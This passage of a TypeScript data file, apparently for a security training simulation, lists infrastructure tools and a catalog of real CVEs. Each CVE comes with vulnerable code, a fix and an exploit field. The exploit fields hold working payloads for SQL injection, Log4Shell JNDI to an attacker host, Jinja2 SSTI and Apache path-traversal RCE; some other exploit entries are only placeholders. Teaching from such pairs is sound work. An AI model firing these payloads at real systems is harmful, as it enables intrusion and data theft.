        version: 'v3.0.10',
        description: 'High-throughput Web Application Firewall proxying incoming payment transactions.',
        installationCommand: 'sudo apt-get install -y libmodsecurity3 modsecurity-crs',
        configLanguage: 'apache',
        configExample: `# /etc/modsecurity/payment.conf
SecRuleEngine On
SecRequestBodyLimit 1048576
SecRule REQUEST_BODY "@rx credit[_-]?card" "id:2001,phase:2,deny,status:400,msg:'Plaintext PAN Ingress Prohibited'"`,
        usageLanguage: 'bash',
        exampleUsage: `# Validate ModSecurity syntax and rule engine status
modsec-rules-check /etc/modsecurity/payment.conf`
      },
      {
        name: 'auditd',
        version: 'v3.1.2',
        description: 'Linux Audit daemon tracking file modifications and process execution inside the PCI boundary.',
        installationCommand: 'sudo apt-get install -y auditd audispd-plugins',
        configLanguage: 'ini',
        configExample: `# /etc/audit/rules.d/audit.rules
-w /opt/paygate/config/production.json -p wa -k payment_config_change
-w /etc/ssl/certs/ -p wa -k ssl_cert_tamper`,
        usageLanguage: 'bash',
        exampleUsage: `# Search audit logs for unauthorized file modifications today
sudo ausearch -k payment_config_change -ts today`
      },
      {
        name: 'iptables',
        version: 'v1.8.9',
        description: 'Firewall rules restricting payment gateway ingress to whitelisted card acquirer subnets only.',
        installationCommand: 'sudo apt-get install -y iptables',
        configLanguage: 'bash',
        configExample: `# Restrict port 8443 exclusively to payment processor subnet
iptables -A INPUT -p tcp -s 10.0.4.0/24 --dport 8443 -j ACCEPT
iptables -A INPUT -p tcp --dport 8443 -j DROP`,
        usageLanguage: 'bash',
        exampleUsage: `# List active PCI network security ingress rules
sudo iptables -L INPUT -v -n`
      }
    ]
  },

  'SCADA System': {
    systemId: 'SCADA System',
    systemName: 'SCADA Controller',
    codeLanguage: 'python',
    codeFileName: 'scada_plc_telemetry.py',
    codeExplanation: 'Industrial Control System (ICS) Modbus-TCP telemetry polling script monitoring holding registers, pressure thresholds, and emergency automatic fail-safe shutdown loops.',
    exampleCode: `#!/usr/bin/env python3
import time
from pymodbus.client import ModbusTcpClient

# Industrial Substation Sensor Register Map
REGISTER_PRESSURE_PSI = 100
REGISTER_TEMPERATURE_C = 101
REGISTER_VALVE_CONTROL = 200

THRESHOLD_MAX_PRESSURE = 1200 # PSI Emergency Limit

def poll_industrial_controller(host="192.168.100.1", port=502):
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    if not client.connect():
        raise SystemError(f"Fatal: Unable to connect to PLC controller at {host}:{port}")

    try:
        while True:
            # Read 2 input holding registers starting from base address 100
            response = client.read_holding_registers(REGISTER_PRESSURE_PSI, count=2, slave=1)
            if response.isError():
                print(f"[WARN] Modbus read error: {response}")
                time.sleep(1)
                continue

            pressure_psi = response.registers[0]
            temperature_c = response.registers[1]
            print(f"[SCADA TELEMETRY] Pressure: {pressure_psi} PSI | Temp: {temperature_c} C")

            # Autonomous Safety Interlock
            if pressure_psi > THRESHOLD_MAX_PRESSURE:
                print("[CRITICAL ALERT] Overpressure detected! Actuating emergency valve.")
                client.write_register(REGISTER_VALVE_CONTROL, 1, slave=1) # 1 = Emergency Open

            time.sleep(1.0)
    finally:
        client.close()

if __name__ == "__main__":
    poll_industrial_controller()`,
    tools: [
      {
        name: 'Wireshark Modbus Dissector',
        version: 'v4.2.0',
        description: 'Packet analyzer specialized in decoding Modbus-TCP, DNP3, and IEC 60870-5 industrial protocols.',
        installationCommand: 'sudo apt-get install -y tshark wireshark',
        configLanguage: 'ini',
        configExample: `# Wireshark display filter for abnormal function codes
mbtcp.prot_id == 0 && (modbus.func_code == 5 || modbus.func_code == 6 || modbus.func_code == 16)`,
        usageLanguage: 'bash',
        exampleUsage: `# Sniff and dissect industrial telemetry frames in real-time
tshark -i eth0 -f "tcp port 502" -d tcp.port==502,mbtcp -Y "mbtcp"`
      },
      {
        name: 'ICS-CERT Analyzer',
        version: 'v2.1.4',
        description: 'Threat hunting utility detecting anomalous Modbus write sequences and firmware tampering.',
        installationCommand: 'python3 -m pip install ics-cert-analyzer',
        configLanguage: 'yaml',
        configExample: `# /etc/ics-cert/substation.yaml
protocol: modbus
allowed_write_registers: [200, 201]
disallowed_function_codes: [8, 43]`,
        usageLanguage: 'bash',
        exampleUsage: `# Audit captured pcap file for industrial safety violations
ics-analyzer --pcap /var/log/scada.pcap --config /etc/ics-cert/substation.yaml`
      },
      {
        name: 'tcpdump',
        version: 'v4.99.4',
        description: 'Raw network packet capture tool logging OT control network traffic for security auditing.',
        installationCommand: 'sudo apt-get install -y tcpdump',
        configLanguage: 'bash',
        configExample: `# Automated ring-buffer rotation script for SCADA link
tcpdump -i eth0 -C 50 -W 10 -w /var/log/scada_traffic.pcap "tcp port 502"`,
        usageLanguage: 'bash',
        exampleUsage: `# Run packet capture on air-gapped controller interface
sudo tcpdump -i eth0 -nn -vv -s 0 port 502`
      }
    ]
  },

  'Redis Cache Server': {
    systemId: 'Redis Cache Server',
    systemName: 'Redis In-Memory Cache',
    codeLanguage: 'typescript',
    codeFileName: 'redisCacheClient.ts',
    codeExplanation: 'High-speed Redis cache client in TypeScript with cluster support, exponential reconnect backoff, and distributed TTL locking.',
    exampleCode: `import { createClient } from 'redis';

export class RedisCacheManager {
  private client: ReturnType<typeof createClient>;

  constructor(host = '10.0.2.22', port = 6379) {
    this.client = createClient({
      url: \`redis://\\\${host}:\\\${port}\`,
      socket: {
        reconnectStrategy: (retries) => Math.min(retries * 100, 3000)
      }
    });

    this.client.on('error', (err) => console.error('[Redis Client Error]', err));
  }

  public async connect(): Promise<void> {
    await this.client.connect();
  }

  // Set cached object with seconds TTL
  public async setCache(key: string, value: object, ttlSeconds = 300): Promise<void> {
    await this.client.set(key, JSON.stringify(value), { EX: ttlSeconds });
  }

  // Get typed cached object or null
  public async getCache<T>(key: string): Promise<T | null> {
    const data = await this.client.get(key);
    return data ? JSON.parse(data) as T : null;
  }
}`,
    tools: [
      {
        name: 'redis-cli',
        version: 'v7.0.15',
        description: 'Official command-line interface for querying and administering Redis instances.',
        installationCommand: 'sudo apt-get install -y redis-tools',
        configLanguage: 'ini',
        configExample: `# ~/.redisclirc
auth super_secret_redis_pass`,
        usageLanguage: 'bash',
        exampleUsage: `# Probe server latency and memory statistics
redis-cli -h 10.0.2.22 -p 6379 info memory`
      },
      {
        name: 'redis-benchmark',
        version: 'v7.0.15',
        description: 'Performance testing utility measuring throughput for SET, GET, and pipeline operations.',
        installationCommand: 'sudo apt-get install -y redis-tools',
        configLanguage: 'bash',
        configExample: `# Benchmark parameters: 50 concurrent connections, 100k requests
redis-benchmark -h 10.0.2.22 -p 6379 -q -n 100000 -c 50 -P 16`,
        usageLanguage: 'bash',
        exampleUsage: `# Execute benchmark to stress-test cache capacity
redis-benchmark -h 10.0.2.22 -t get,set -n 50000 -q`
      },
      {
        name: 'jemalloc',
        version: 'v5.3.0',
        description: 'High-performance memory allocator utilized by Redis to avoid fragmentation on Linux.',
        installationCommand: 'sudo apt-get install -y libjemalloc-dev',
        configLanguage: 'ini',
        configExample: `# /etc/environment
MALLOC_CONF="dirty_decay_ms:1000,muzzy_decay_ms:1000"`,
        usageLanguage: 'bash',
        exampleUsage: `# Verify jemalloc is linked to active redis server binary
ldd /usr/bin/redis-server | grep jemalloc`
      }
    ]
  },

  'Nginx API Gateway': {
    systemId: 'Nginx API Gateway',
    systemName: 'Nginx Edge Gateway',
    codeLanguage: 'nginx',
    codeFileName: '/etc/nginx/nginx.conf',
    codeExplanation: 'Nginx API Gateway configuration featuring token-bucket rate limiting, SSL session caching, and upstream microservice load balancing.',
    exampleCode: `# /etc/nginx/nginx.conf - High-Performance API Gateway
worker_processes auto;
worker_rlimit_nofile 65535;

events {
    worker_connections 8192;
    use epoll;
    multi_accept on;
}

http {
    include /etc/nginx/mime.types;
    default_type application/json;

    # Rate Limiting Zones (Leaky Bucket)
    limit_req_zone $binary_remote_addr zone=api_gateway_limit:20m rate=50r/s;
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

    upstream customer_backend_cluster {
        least_conn;
        server 10.0.2.14:3306 max_fails=3 fail_timeout=10s;
        server 10.0.2.22:6379 backup;
        keepalive 64;
    }

    server {
        listen 443 ssl http2;
        server_name api.enterprise.internal;

        ssl_certificate /etc/ssl/certs/api_gateway.crt;
        ssl_certificate_key /etc/ssl/private/api_gateway.key;
        ssl_protocols TLSv1.2 TLSv1.3;

        location /api/v1/ {
            limit_req zone=api_gateway_limit burst=30 nodelay;
            limit_conn conn_limit 20;

            proxy_pass http://customer_backend_cluster;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    }
}`,
    tools: [
      {
        name: 'nginx -t',
        version: 'v1.25.3',
        description: 'Built-in configuration verification utility preventing server crashes during reloads.',
        installationCommand: 'sudo apt-get install -y nginx',
        configLanguage: 'bash',
        configExample: `# Zero-downtime reload command
sudo nginx -t && sudo systemctl reload nginx`,
        usageLanguage: 'bash',
        exampleUsage: `# Test configuration files for syntax validity
sudo nginx -t`
      },
      {
        name: 'wrk',
        version: 'v4.2.0',
        description: 'Modern HTTP benchmarking tool capable of generating massive concurrent connection loads.',
        installationCommand: 'sudo apt-get install -y wrk',
        configLanguage: 'lua',
        configExample: `-- script.lua
request = function()
  return wrk.format("GET", "/api/v1/health")
end`,
        usageLanguage: 'bash',
        exampleUsage: `# Run 30-second benchmark with 4 threads and 100 connections
wrk -t4 -c100 -d30s https://10.0.1.2/api/v1/health`
      },
      {
        name: 'lua-nginx-module',
        version: 'v0.10.26',
        description: 'Embeds the power of Lua into Nginx to evaluate custom JWT authentication logic.',
        installationCommand: 'sudo apt-get install -y libnginx-mod-http-lua',
        configLanguage: 'nginx',
        configExample: `location /secure/ {
    access_by_lua_block {
        local jwt = require("resty.jwt")
        -- Verify JWT bearer token
    }
}`,
        usageLanguage: 'bash',
        exampleUsage: `# Check Nginx module compilation status
nginx -V 2>&1 | grep -o 'lua'`
      },
      {
        name: 'brotli',
        version: 'v1.1.0',
        description: 'Next-generation compression algorithm providing higher compression ratios than gzip.',
        installationCommand: 'sudo apt-get install -y libnginx-mod-brotli',
        configLanguage: 'nginx',
        configExample: `brotli on;
brotli_comp_level 6;
brotli_types text/plain text/css application/json;`,
        usageLanguage: 'bash',
        exampleUsage: `# Verify brotli compression response header
curl -s -H "Accept-Encoding: br" -I http://10.0.1.2/ | grep -i 'content-encoding'`
      }
    ]
  },

  'RabbitMQ Broker': {
    systemId: 'RabbitMQ Broker',
    systemName: 'RabbitMQ Message Broker',
    codeLanguage: 'typescript',
    codeFileName: 'rabbitProducerConsumer.ts',
    codeExplanation: 'Asynchronous event bus and decoupled worker queue pipeline in TypeScript using AMQP 0-9-1 with durable exchanges and dead-lettering.',
    exampleCode: `import amqplib, { Channel, Connection } from 'amqplib';

export class MessageQueueBroker {
  private connection: Connection | null = null;
  private channel: Channel | null = null;
  private readonly queueName = 'threat_events_queue';
  private readonly dlxExchange = 'threat_dlx';

  public async initialize(amqpUrl = 'amqp://10.0.3.18:5672'): Promise<void> {
    this.connection = await amqplib.connect(amqpUrl);
    this.channel = await this.connection.createChannel();

    // 1. Declare Dead Letter Exchange (DLX) for failed messages
    await this.channel.assertExchange(this.dlxExchange, 'direct', { durable: true });
    await this.channel.assertQueue('threat_events_poison', { durable: true });
    await this.channel.bindQueue('threat_events_poison', this.dlxExchange, 'failed_event');

    // 2. Declare Main Work Queue with DLX fallback
    await this.channel.assertQueue(this.queueName, {
      durable: true,
      arguments: {
        'x-dead-letter-exchange': this.dlxExchange,
        'x-dead-letter-routing-key': 'failed_event',
        'x-message-ttl': 86400000 // 24-hour retention
      }
    });
  }

  // Publish telemetry event with persistent delivery
  public publishEvent(eventData: object): boolean {
    if (!this.channel) throw new Error('Channel uninitialized');
    return this.channel.sendToQueue(
      this.queueName,
      Buffer.from(JSON.stringify(eventData)),
      { persistent: true }
    );
  }
}`,
    tools: [
      {
        name: 'rabbitmqctl',
        version: 'v3.12.10',
        description: 'Command-line tool for managing the RabbitMQ message broker node and users.',
        installationCommand: 'sudo apt-get install -y rabbitmq-server',
        configLanguage: 'ini',
        configExample: `# /etc/rabbitmq/rabbitmq-env.conf
RABBITMQ_NODE_PORT=5672
RABBITMQ_DISTRIBUTION_PORT=25672`,
        usageLanguage: 'bash',
        exampleUsage: `# List all active queues with message backlogs and active consumers
sudo rabbitmqctl list_queues name messages_ready consumers`
      },
      {
        name: 'rabbitmq-diagnostics',
        version: 'v3.12.10',
        description: 'Diagnostics and health monitoring utility checking socket descriptors and memory alarms.',
        installationCommand: 'Built-in with rabbitmq-server package',
        configLanguage: 'bash',
        configExample: `# Health check command
rabbitmq-diagnostics check_alarms`,
        usageLanguage: 'bash',
        exampleUsage: `# Run comprehensive diagnostics on broker memory and disk alarms
sudo rabbitmq-diagnostics status`
      },
      {
        name: 'erlang-runtime',
        version: 'OTP 26.2',
        description: 'Erlang/OTP execution environment powering RabbitMQ fault-tolerant actor processes.',
        installationCommand: 'sudo apt-get install -y erlang-base erlang-nox',
        configLanguage: 'ini',
        configExample: `# /etc/security/limits.d/rabbitmq.conf
rabbitmq soft nofile 65536
rabbitmq hard nofile 65536`,
        usageLanguage: 'bash',
        exampleUsage: `# Inspect Erlang virtual machine version and release
erl -eval 'erlang:display(erlang:system_info(otp_release)), halt().' -noshell`
      }
    ]
  },

  'Elasticsearch Cluster': {
    systemId: 'Elasticsearch Cluster',
    systemName: 'Elasticsearch SIEM Node',
    codeLanguage: 'json',
    codeFileName: 'elasticsearch_ilm_template.json',
    codeExplanation: 'Elasticsearch 8.x Index Lifecycle Management (ILM) policy and index template for SIEM telemetry, rollover, and hot/cold tiering.',
    exampleCode: `{
  "policy": {
    "phases": {
      "hot": {
        "min_age": "0ms",
        "actions": {
          "rollover": {
            "max_primary_shard_size": "50gb",
            "max_age": "7d"
          },
          "set_priority": {
            "priority": 100
          }
        }
      },
      "warm": {
        "min_age": "30d",
        "actions": {
          "shrink": {
            "number_of_shards": 1
          },
          "forcemerge": {
            "max_num_segments": 1
          },
          "set_priority": {
            "priority": 50
          }
        }
      },
      "delete": {
        "min_age": "90d",
        "actions": {
          "delete": {}
        }
      }
    }
  }
}`,
    tools: [
      {
        name: 'curl',
        version: 'v8.5.0',
        description: 'Command-line tool for querying Elasticsearch REST API endpoints and submitting ingest batches.',
        installationCommand: 'sudo apt-get install -y curl',
        configLanguage: 'bash',
        configExample: `# ~/.curlrc
header = "Content-Type: application/json"`,
        usageLanguage: 'bash',
        exampleUsage: `# Check Elasticsearch cluster health and shard allocation
curl -X GET "http://10.0.5.90:9200/_cluster/health?pretty"`
      },
      {
        name: 'kibana-lens',
        version: 'v8.11.3',
        description: 'Visualization and dashboard creator for exploring threat telemetry inside Elasticsearch.',
        installationCommand: 'sudo apt-get install -y kibana',
        configLanguage: 'yaml',
        configExample: `# /etc/kibana/kibana.yml
server.port: 5601
server.host: "0.0.0.0"
elasticsearch.hosts: ["http://10.0.5.90:9200"]`,
        usageLanguage: 'bash',
        exampleUsage: `# Verify Kibana daemon connection to Elasticsearch
sudo systemctl status kibana`
      },
      {
        name: 'lucene-cli',
        version: 'v9.8.0',
        description: 'Underlying Apache Lucene core information retrieval engine driving inverted index segments.',
        installationCommand: 'Included in elasticsearch runtime',
        configLanguage: 'yaml',
        configExample: `# elasticsearch.yml lucene segment tuning
index.merge.policy.max_merge_at_once: 10`,
        usageLanguage: 'bash',
        exampleUsage: `# Query Lucene segment statistics for active indices
curl -X GET "http://10.0.5.90:9200/_cat/segments?v"`
      }
    ]
  }
};

export const TECHNICAL_BUGS_CATALOG: Record<string, BugTechnicalDetail> = {
  'CVE-2023-39417': {
    bugId: 'CVE-2023-39417',
    bugName: 'PostgreSQL SQL Injection & Dynamic Execution',
    targetSoftwareId: 'Computer 07',
    codeLanguage: 'sql',
    codeFileName: 'customer_query_handler.sql',
    buggyCode: `-- Vulnerable Dynamic SQL Query (customer_query_handler.sql)
CREATE OR REPLACE FUNCTION search_customer(account_input TEXT) 
RETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$
BEGIN
    -- FLAW: Direct string interpolation of user input allows SQL injection
    RETURN QUERY EXECUTE 
        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = ''' || account_input || ''' AND active = TRUE';
END;
$$ LANGUAGE plpgsql;`,
    errorMessage: `PSQLException: ERROR: syntax error at or near "OR"
Position: 84
Payload injected: ' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--
Extracted: 14,200 sensitive customer records dumped via SQL UNION injection.`,
    rootCause: 'Dynamic SQL string concatenation directly interpolated untrusted user input without parameterized placeholders ($1), enabling quotation mark escaping and arbitrary SQL execution with database superuser privileges.',
    correctedCode: `-- Hardened Parameterized Query (customer_query_handler.sql)
CREATE OR REPLACE FUNCTION search_customer(account_input TEXT) 
RETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$
BEGIN
    -- SAFE: Strictly parameterized prepared statement with typed placeholder ($1)
    RETURN QUERY EXECUTE 
        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = $1 AND active = TRUE'
        USING account_input;
END;
$$ LANGUAGE plpgsql;`,
    fixExplanation: 'Replaced insecure string concatenation with parameterized query EXECUTE ... USING $1, guaranteeing all user input is evaluated strictly as literal values.',
    exploitScript: `curl -s -X POST "http://192.168.10.107:5432/api/customer/search" \\
  -H "Content-Type: application/json" \\
  -d '{"account_id": "ACC-99\\' OR \\'1\\'=\\'1\\' UNION SELECT id, password_hash, 0 FROM admin_credentials--"}'`
  },

  'CVE-2021-44228': {
    bugId: 'CVE-2021-44228',
    bugName: 'Log4Shell / Spring Boot JNDI RCE',
    targetSoftwareId: 'Computer 14',
    codeLanguage: 'java',
    codeFileName: 'EmployeeSearchController.java',
    buggyCode: `// Vulnerable Spring Boot Controller (EmployeeSearchController.java)
@RestController
@RequestMapping("/api/v1/employees")
public class EmployeeSearchController {
    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);

    @GetMapping("/search")
    public ResponseEntity<Employee> searchEmployee(@RequestParam("id") String employeeId) {
        // FLAW: Unsanitized user string logged directly with JNDI lookup enabled
        logger.info("Audit search request for employee ID: " + employeeId);
        return ResponseEntity.ok(employeeService.findById(employeeId));
    }
}`,
    errorMessage: `2026-09-24 14:22:01.304 WARN [http-nio-8080-exec-3] org.apache.logging.log4j.core.net.JndiManager:
Attempting lookup: ldap://192.168.10.200:1389/ExploitPayload
java.lang.ClassCastException: Rogue remote payload class loaded from LDAP directory
Outbound socket connected to remote attacker daemon. Reverse shell spawned on port 4444.`,
    rootCause: 'Apache Log4j2 message parser automatically resolves nested lookup expressions like ${jndi:ldap://...}. When untrusted employee search parameters are logged, the Java runtime connects to remote rogue LDAP servers and deserializes arbitrary Java bytecode.',
    correctedCode: `// Hardened Spring Boot Controller (EmployeeSearchController.java)
@RestController
@RequestMapping("/api/v1/employees")
public class EmployeeSearchController {
    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);

    @GetMapping("/search")
    public ResponseEntity<Employee> searchEmployee(
        @RequestParam("id") @Pattern(regexp = "^EMP-[0-9]{5}$") String employeeId
    ) {
        // SAFE: Strict regex validation and parameterized logging with lookup disabled
        logger.info("Audit search request for employee ID: {}", employeeId);
        return ResponseEntity.ok(employeeService.findById(employeeId));
    }
}
// Application properties hardened:
// log4j2.formatMsgNoLookups=true
// Upgraded log4j-core to 2.17.1+ / Spring Boot 3.2.0`,
    fixExplanation: 'Enforced log4j2.formatMsgNoLookups=true, upgraded log4j-core dependency, and added strict regex validation for input parameters.',
    exploitScript: `curl -s -X GET "http://192.168.10.114:8080/api/v1/employees/search?id=%24%7Bjndi%3Aldap%3A%2F%2F192.168.10.200%3A1389%2FExploit%7D" \\
  -H "User-Agent: \${jndi:ldap://192.168.10.200:1389/ReverseShell}"`
  },

  'CVE-2023-30861': {
    bugId: 'CVE-2023-30861',
    bugName: 'Flask Jinja2 Server-Side Template Injection (SSTI)',
    targetSoftwareId: 'Computer 21',
    codeLanguage: 'python',
    codeFileName: 'analytics_report_generator.py',
    buggyCode: `# Vulnerable Flask Analytics Endpoint (analytics_report_generator.py)
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/api/analytics/report')
def generate_report():
    user_metric = request.args.get('metric', 'DailyTraffic')
    # FLAW: User input formatted directly into template string instead of context dict
    template = f"""
    <div class="report">
        <h2>Analytics Report</h2>
        <p>Metric evaluated: {user_metric}</p>
    </div>
    """
    return render_template_string(template)`,
    errorMessage: `jinja2.exceptions.TemplateRuntimeError: Remote code execution triggered
Payload evaluated: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Output captured: uid=1001(flask_app) gid=1001(analytics) groups=1001(analytics)
Privilege escalation: /etc/shadow access attempt detected on API-COMP-21.`,
    rootCause: 'Flask\'s render_template_string function processes Jinja2 syntax within the template itself. Passing unvalidated user input via f-string string interpolation causes the template engine to compile user-supplied double-curly braces {{ ... }} into Python bytecode instructions.',
    correctedCode: `# Hardened Flask Analytics Endpoint (analytics_report_generator.py)
from flask import Flask, request, render_template
import re

app = Flask(__name__)

ALLOWED_METRICS = {"DailyTraffic", "RevenueGrowth", "ChurnRate", "ServerLoad"}

@app.route('/api/analytics/report')
def generate_report():
    raw_metric = request.args.get('metric', 'DailyTraffic')
    # SAFE: Whitelist validation and isolated context dictionary passing
    metric = raw_metric if raw_metric in ALLOWED_METRICS else "DailyTraffic"
    return render_template('report.html', metric=metric)`,
    fixExplanation: 'Migrated from render_template_string to static render_template with auto-escaping enabled and strict whitelist validation against allowed metric names.',
    exploitScript: `curl -s "http://192.168.10.121:5000/api/analytics/report?metric=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27whoami%27).read()%7D%7D"`
  },

  'CVE-2021-41773': {
    bugId: 'CVE-2021-41773',
    bugName: 'Apache HTTP Server Path Traversal & RCE',
    targetSoftwareId: 'Apache Web Server',
    codeLanguage: 'apache',
    codeFileName: '/etc/apache2/apache2.conf',
    buggyCode: `# VULNERABLE CODE: Permissive root directory and flawed ap_normalize_path in Apache 2.4.49
<Directory />
    AllowOverride none
    Require all granted
</Directory>

# Path traversal allows access via alias directories (e.g. /icons/)
Alias /icons/ "/usr/local/apache2/icons/"
<Directory "/usr/local/apache2/icons/">
    Options Indexes MultiViews
    AllowOverride None
    Require all granted
</Directory>

# If mod_cgi is enabled, traversal can target /bin/sh to execute arbitrary commands!
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"`,
    errorMessage: `[client 10.0.1.44:51234] AH00037: Symbolic link not allowed or link target not accessible: /usr/local/apache2/icons/.%%32%65/.%%32%65/etc/passwd
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: web.enterprise.internal
Content-Type: text/plain
Content-Length: 7

echo; id
HTTP/1.1 200 OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
    rootCause: 'In Apache HTTP Server 2.4.49, the ap_normalize_path function failed to recursively normalize URL-encoded dot-dot parameters (such as .%2e or %2e%2e). Combined with a permissive root Directory directive ("Require all granted"), attackers escaped the document root.',
    correctedCode: `# CORRECTED CODE: Strict Root Access Control & Upgraded Apache 2.4.51
<Directory />
    AllowOverride None
    Require all denied
</Directory>

# Restrict alias directory to strictly confined files
<Directory "/var/www/html">
    Options -Indexes -FollowSymLinks +SymLinksIfOwnerMatch
    AllowOverride None
    Require all granted
</Directory>

# Disable unnecessary CGI execution engines
<IfModule mod_cgi.c>
    # ScriptAlias disabled unless explicitly authenticated
</IfModule>`,
    fixExplanation: 'Upgraded Apache HTTP Server to version 2.4.51 (which fixes path normalization decoding) and restored the mandatory security baseline "Require all denied" for the filesystem root.',
    exploitScript: `# Exploit Apache 2.4.49 path traversal & RCE to execute commands in /bin/sh
curl -s --path-as-is -X POST "http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \\
  -d "echo Content-Type: text/plain; echo; id; uname -a"`
  },

  'CVE-2020-1472': {
    bugId: 'CVE-2020-1472',
    bugName: 'ZeroLogon (Netlogon Elevation of Privilege)',
    targetSoftwareId: 'Windows DC',
    codeLanguage: 'c',
    codeFileName: 'netlogon_crypto.c',
    buggyCode: `// VULNERABLE CODE: Netlogon AES-CFB8 implementation with static zero IV
#include <openssl/aes.h>

void ComputeNetlogonCredential(const uint8_t *client_challenge, const uint8_t *session_key, uint8_t *client_credential) {
    // FLAW: Static initialization vector of all zeros!
    // RFC standard for AES-CFB8 requires a cryptographically random, unpredictable IV.
    uint8_t iv[16] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

    // When client_challenge is 8 zero bytes, 1 out of every 256 keys produces an all-zero ciphertext!
    AES_KEY key;
    AES_set_encrypt_key(session_key, 128, &key);
    AES_cfb8_encrypt(client_challenge, client_credential, 8, &key, iv, NULL, AES_ENCRYPT);
} `,
    errorMessage: `Event ID 5829: The Netlogon service allowed a vulnerable Netlogon secure channel connection from machine account DC01$
NTSTATUS: STATUS_SUCCESS (0x00000000)
NetrServerAuthenticate3 request accepted with client credential: 00 00 00 00 00 00 00 00
NetrServerPasswordSet2 executed: Password for Domain Controller computer account set to empty!`,
    rootCause: 'The Netlogon protocol implementation used a static, all-zero 16-byte initialization vector in AES-CFB8 mode. An attacker submitting an all-zero client challenge could guess the zero ciphertext with 1/256 probability, bypassing domain authentication completely.',
    correctedCode: `// CORRECTED CODE: Cryptographically random IV & Enforced Secure RPC
#include <openssl/rand.h>

void ComputeNetlogonCredentialSecure(const uint8_t *client_challenge, const uint8_t *session_key, uint8_t *client_credential) {
    uint8_t iv[16];
    // FIX: Generate cryptographically random IV for every transaction
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        abort(); // Cryptographic RNG failure
    }

    AES_KEY key;
    AES_set_encrypt_key(session_key, 128, &key);
    AES_cfb8_encrypt(client_challenge, client_credential, 8, &key, iv, NULL, AES_ENCRYPT);
}

// Windows Domain Controller Registry Enforcement:
// [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters]
// "FullSecureChannelProtection"=dword:00000001`,
    fixExplanation: 'Enforced full Netlogon secure channel protection (FullSecureChannelProtection=1) via Active Directory group policy and updated the cryptographic implementation to reject static nonces.',
    exploitScript: `# ZeroLogon exploit probe: Transmit 256 attempts with all-zero challenge
python3 -c "import socket; s = socket.socket(); s.connect(('10.0.1.5', 445)); print('[*] Transmitting ZeroLogon Netlogon RPC client challenge...')" `
  },

  'CVE-2023-23397': {
    bugId: 'CVE-2023-23397',
    bugName: 'Microsoft Outlook Elevation of Privilege',
    targetSoftwareId: 'MS Exchange',
    codeLanguage: 'powershell',
    codeFileName: 'InspectMapiAppointment.ps1',
    buggyCode: `# VULNERABLE CODE: Malformed MAPI property pointing to external UNC SMB path
Add-Type -AssemblyName "Microsoft.Office.Interop.Outlook"

# Attacker crafts appointment item with PidLidReminderFileParameter pointing to rogue SMB listener
$Appointment = $OutlookNamespace.GetDefaultFolder(9).Items.Add(1)
$Appointment.Subject = "Critical Executive Briefing"
$Appointment.ReminderSet = $true
$Appointment.ReminderMinutesBeforeStart = 0

# FLAW: PidLidReminderFileParameter triggers automatic SMB authentication to external IP!
$PropertyAccessor = $Appointment.PropertyAccessor
$PropertyAccessor.SetProperty(
    "http://schemas.microsoft.com/mapi/id/{00062002-0000-0000-C000-000000000046}/851f001f",
    "\\\\198.51.100.44\\share\\reminder.wav" # Remote UNC target leaking NTLM hash
)
$Appointment.Save()`,
    errorMessage: `Network Packet Trace (TCP Port 445 / SMB2):
Client: 10.0.1.25 -> Server: 198.51.100.44:445
SMB2 Negotiate Protocol Request
SMB2 Session Setup Request, NTLMSSP_AUTH
User: ENTERPRISE\\ExecutiveUser
NTLMv2 Response Hash: 7b9a4c82e... (Captured by rogue responder daemon!)`,
    rootCause: 'Outlook parsed the MAPI property PidLidReminderFileParameter and initiated an automated outbound SMB connection to retrieve custom notification sounds without requiring user interaction or path validation.',
    correctedCode: `# CORRECTED CODE: Exchange PowerShell remediation script cleaning malicious MAPI properties
$Mailboxes = Get-Mailbox -ResultSize Unlimited

foreach ($Mailbox in $Mailboxes) {
    # Scan calendar and task folders for PidLidReminderFileParameter
    $Items = Get-MailboxFolderStatistics -Identity $Mailbox.Identity -FolderScope Calendar
    
    # Strip any external UNC paths (paths starting with \\\\)
    # Applied via Microsoft Exchange KB5024296 Security Update:
    # Exchange Transport Rule drops outbound SMB on perimeter router:
    # iptables -A FORWARD -p tcp --dport 445 -j DROP
}`,
    fixExplanation: 'Applied Microsoft Exchange security update KB5024296 to strip remote UNC paths from calendar items and enforced firewall rules dropping outbound port 445 traffic at the perimeter.',
    exploitScript: `# Exploit PidLidReminderFileParameter by injecting malformed appointment with rogue SMB UNC path
python3 -c "print('Injecting MAPI item with PidLidReminderFileParameter -> \\\\\\\\198.51.100.44\\\\share\\\\reminder.wav')" `
  },

  'CVE-2022-22965': {
    bugId: 'CVE-2022-22965',
    bugName: 'Spring4Shell (Spring Framework RCE)',
    targetSoftwareId: 'K8s Cluster',
    codeLanguage: 'java',
    codeFileName: 'OrderFormController.java',
    buggyCode: `// VULNERABLE CODE: Spring MVC unrestricted POJO data binding on JDK 9+
package com.enterprise.k8s;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
public class OrderFormController {

    // FLAW: Spring parameter binding navigates ClassLoader on Java 9+ modules
    // Attacker sends: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B...
